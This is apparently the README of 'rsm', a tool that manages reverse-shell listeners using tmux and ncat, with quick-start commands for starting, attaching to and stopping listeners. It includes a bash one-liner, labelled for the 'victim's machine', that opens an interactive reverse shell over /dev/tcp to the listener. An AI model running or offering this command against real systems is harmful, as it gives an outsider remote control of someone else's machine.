# rsm

A simple reverse shell manager using `tmux` and `ncat`.

## Quick Start

Listening on a port

```shell
git clone https://github.com/djosix/rsm.git
cd rsm

./rsm 11111
# You will attach to a tmux session called 'rsm-11111',
# where 11111 is your listening port.
```

On victim's machine, launch a reverse shell

```shell
bash -c 'bash -i >& /dev/tcp/127.0.0.1/11111 0<&1'
# Once connected to the listening port,
# the script will create a window in our tmux session.
# Just switch to that window and interact with the client.
```

Attaching to the last rsm session

```shell
./rsm attach
```

Stop the server and cleanup

```shell
./rsm stop
# Stop all rsm listeners
```
